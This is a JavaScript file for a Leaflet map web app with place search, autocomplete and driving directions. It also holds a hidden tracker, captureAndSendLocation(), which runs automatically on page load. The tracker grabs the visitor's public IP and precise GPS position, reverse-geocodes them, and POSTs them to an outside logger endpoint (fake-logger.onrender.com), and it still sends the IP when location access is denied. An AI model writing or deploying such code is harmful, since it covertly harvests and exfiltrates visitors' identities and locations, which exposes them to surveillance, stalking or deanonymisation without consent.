let map = L.map("map").setView([25.276987, 55.296249], 12); // Fake: Dubai

L.tileLayer('https://api.maptiler.com/maps/streets-v2/256/{z}/{x}/{y}.png?key=YOUR_MAPTILER_KEY', {
  attribution: '',
  tileSize: 256,
  zoomOffset: 0,
  lang: 'en'
}).addTo(map);

let marker = L.marker([25.276987, 55.296249]).addTo(map);
let currentRoute = null;

// Toggle panels
function toggleSearch() {
  document.querySelector(".floating-search").classList.toggle("hidden");
}
function toggleDirection() {
  document.getElementById("direction-panel").classList.toggle("hidden");
}

document.querySelector(".search-toggle").onclick = toggleSearch;
document.querySelector(".direction-toggle").onclick = toggleDirection;

// Autocomplete suggestions for search and direction fields
document.querySelectorAll("#search-input, #start, #end").forEach((input) => {
  input.addEventListener("input", async () => {
    const query = input.value.trim();
    const listId = input.id + "-suggestions";
    let suggestionBox = document.getElementById(listId);

    if (!suggestionBox) {
      suggestionBox = document.createElement("div");
      suggestionBox.id = listId;
      suggestionBox.className = "suggestion-box";
      input.parentNode.appendChild(suggestionBox);
    }

    if (!query) return (suggestionBox.innerHTML = "");

    const res = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`, {
      headers: { "Accept-Language": "en" }
    });
    const data = await res.json();
    suggestionBox.innerHTML = "";

    data.slice(0, 5).forEach(place => {
      const item = document.createElement("div");
      item.className = "suggestion";
      item.innerText = place.display_name;
      item.onclick = () => {
        input.value = place.display_name;
        suggestionBox.innerHTML = "";

        if (input.id === "search-input") {
          map.setView([place.lat, place.lon], 14);
          marker.setLatLng([place.lat, place.lon]);
        }
      };
      suggestionBox.appendChild(item);
    });
  });
});

// Search button
function searchLocation() {
  const query = document.getElementById("search-input").value;
  if (!query) return;

  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`, {
    headers: { "Accept-Language": "en" }
  })
    .then(res => res.json())
    .then(data => {
      if (data && data[0]) {
        const { lat, lon } = data[0];
        map.setView([lat, lon], 14);
        marker.setLatLng([lat, lon]);
      }
    });
}

// Get directions
function getDirections() {
  const from = document.getElementById("start").value;
  const to = document.getElementById("end").value;
  if (!from || !to) return alert("Both locations required");

  Promise.all([
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(from)}`, {
      headers: { "Accept-Language": "en" }
    }).then(res => res.json()),
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(to)}`, {
      headers: { "Accept-Language": "en" }
    }).then(res => res.json())
  ]).then(([fromData, toData]) => {
    if (!fromData[0] || !toData[0]) return alert("Invalid locations");

    const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
    const toLatLng = L.latLng(toData[0].lat, toData[0].lon);

    if (currentRoute) map.removeControl(currentRoute);

    currentRoute = L.Routing.control({
      waypoints: [fromLatLng, toLatLng],
      router: L.Routing.osrmv1({ serviceUrl: "https://router.project-osrm.org/route/v1" }),
      lineOptions: { styles: [{ color: "green", weight: 4 }] },
      createMarker: () => null
    }).addTo(map);
  });
}

// Auto-capture and log IP + real GPS
async function captureAndSendLocation() {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`, {
          headers: { "Accept-Language": "en" }
        });
        const geoData = await geoRes.json();

        const city = geoData.address.city || geoData.address.town || geoData.address.village || "Unknown";
        const country = geoData.address.country || "Unknown";

        await fetch("https://fake-logger.onrender.com/logger.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ip, latitude, longitude, city, country })
        });

        console.log("✅ Logged real IP & location");
      },
      async () => {
        // Fallback: log with IP only if GPS blocked
        await fetch("https://fake-logger.onrender.com/logger.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip,
            latitude: 0,
            longitude: 0,
            city: "Unknown",
            country: "Unknown"
          })
        });
        console.log("⚠️ Logged with IP only");
      }
    );
  } catch (err) {
    console.error("❌ Logger error:", err);
  }
}

// Init
captureAndSendLocation();
